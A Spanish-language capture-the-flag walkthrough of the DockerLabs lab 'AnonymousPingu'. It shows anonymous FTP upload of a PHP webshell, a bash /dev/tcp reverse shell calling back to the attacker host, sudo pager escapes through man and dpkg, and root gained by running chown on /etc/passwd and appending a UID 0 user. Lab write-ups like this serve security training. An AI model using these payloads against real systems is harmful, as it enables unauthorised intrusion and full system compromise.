# DockerLabs - AnonymousPingu

FTP login como anonymous activado y vinculado con el servidor web de la máquina.

## Despliegue

```bash
docker load -i anonymouspingu.tar
docker run -d --rm --name anonymouspingu anonymouspingu:latest
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **21/tcp** — FTP (anonymous habilitado)
- **80/tcp** — HTTP (Apache)

## Enumeración FTP

```bash
ftp 172.17.0.2
# user: anonymous / pass: (vacío)
ls -la
```

Contenido del FTP (raíz del servidor web):
```
-rw-r--r-- about.html
-rw-r--r-- contact.html
-rw-r--r-- index.html
-rw-r--r-- service.html
drwxrwxrwx upload/    ← escritura para todos
drwxr-xr-x css/
drwxr-xr-x images/
drwxr-xr-x js/
drwxr-xr-x heustonn-html/
```

El directorio `upload/` tiene permisos 777 — escritura pública.

## Intrusión — Webshell via FTP

```bash
# Crear webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Subir via FTP
ftp 172.17.0.2
cd upload
put /tmp/shell.php shell.php
```

Verificar RCE:
```bash
curl "http://172.17.0.2/upload/shell.php?cmd=whoami"
# www-data
```

Reverse shell (listener en 4444):
```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — lanzar via curl (URL-encoded)
curl "http://172.17.0.2/upload/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.17.0.1/4444+0>%261'"
```

Acceso como **www-data**.

## Escalada — www-data → pingu

```bash
sudo -l
# (pingu) NOPASSWD: /usr/bin/man
```

www-data puede ejecutar man como pingu sin contraseña. `man` requiere TTY para abrir el pager, por lo que primero se realiza un tratamiento de TTY:

```bash
# Tratamiento de TTY
script /dev/null -c bash
# Ctrl+Z  (pausa la shell víctima)
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

Con TTY completa, abrimos man como pingu y escapamos al shell desde el pager:

```bash
sudo -u pingu man man
# Dentro del pager (less), escribir:
!/bin/sh
```

Acceso como **pingu**.

## Escalada — pingu → gladys

```bash
sudo -l
# (gladys) NOPASSWD: /usr/bin/dpkg
# (gladys) NOPASSWD: /usr/bin/nmap
```

dpkg también usa pager — mismo truco:

```bash
sudo -u gladys dpkg -l
# Dentro del pager (less), escribir:
!/bin/sh
```

Acceso como **gladys**.

## Escalada — gladys → root

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/chown
```

gladys puede ejecutar `chown` como root. Se abusa para cambiar el propietario de `/etc/passwd` y añadir un usuario con UID 0:

```bash
sudo chown gladys /etc/passwd
echo 'sreaper::0:0:root:/root:/bin/bash' >> /etc/passwd
su sreaper
whoami
# root
```

## Conclusión

Cadena de ataque completa:

1. **Reconocimiento** — nmap detecta FTP con anonymous y servidor web Apache
2. **FTP** — login anónimo, directorio `upload/` con permisos 777
3. **Webshell** — upload de shell.php via FTP, RCE confirmado via curl
4. **Reverse shell** — acceso como www-data
5. **TTY** — tratamiento con script + stty para obtener terminal interactiva
6. **www-data → pingu** — sudo man como pingu, escape con `!/bin/sh` desde less
7. **pingu → gladys** — sudo dpkg como gladys, mismo escape con `!/bin/sh`
8. **gladys → root** — sudo chown sobre /etc/passwd, inyección de usuario con UID 0

**Lecciones aprendidas:**
- FTP anónimo con acceso de escritura a la raíz web es crítico — permite subir webshells directamente.
- Los pagers (less/more) permiten ejecutar comandos con `!` — cualquier binario que los use como pager es explotable via GTFOBins.
- `chown` con sudo sin restricciones permite comprometer `/etc/passwd` y escalar a root sin exploits.
